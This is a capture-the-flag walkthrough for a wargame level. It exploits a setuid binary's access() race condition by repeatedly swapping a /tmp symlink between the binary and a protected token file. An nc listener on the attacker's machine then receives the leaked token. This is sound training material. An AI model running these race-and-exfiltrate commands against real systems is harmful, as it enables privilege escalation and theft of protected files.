## LEVEL 10

First, we search for files to exploit.  
-> `ls -la` or `la`  
We can see that we have a program named *level10* and a file named *token*, but you can't read *token*. So, let's filter *level10* with printable chracters only.  
-> `strings level10`  
Here, we can notice that it takes a filename and a host ip as parameters and connect to the host using port 6969 to send it the content of the file.

> **nm** is a command that lists all symbols from object files. When a file is compiled, it turns into an object file containing symbols from the functions and variables that were in the code.

Next, we look up the functions that are used in the binary file.  
-> `nm -u level10`  
At the first sight, the program contains functions that prints strings, manipulate files and connect to a server. But we can notice the usage of *access()*, that have a security hole as stipulated in the [manual](https://man7.org/linux/man-pages/man2/access.2.html). So we can exploit this using *symlink* to get our token.

Firstly, on a terminal connected to the virtual machine via SSH, we create infinitely symlink between *level10* and *token* with a file in */tmp*.  
-> `while true; do ln -fs ~/level10 /tmp/flag; ln -fs ~/token /tmp/flag; done`  
Secondly, on another terminal that is on our local machine, we launch a server listening on port 6969.  
-> `nc -lk 6969`  
Thirdly, on a terminal connected to the virtual machine, we launch infinitely the program using the file that are link with either *level10* or *token*.  
-> `while true; do ./level10 /tmp/flag {local_ip}; done`  
And it should print the token to connect to *flag10*.  
-> `su flag10`  

> Copy and paste the token.

-> `getflag`  
-> `su level11`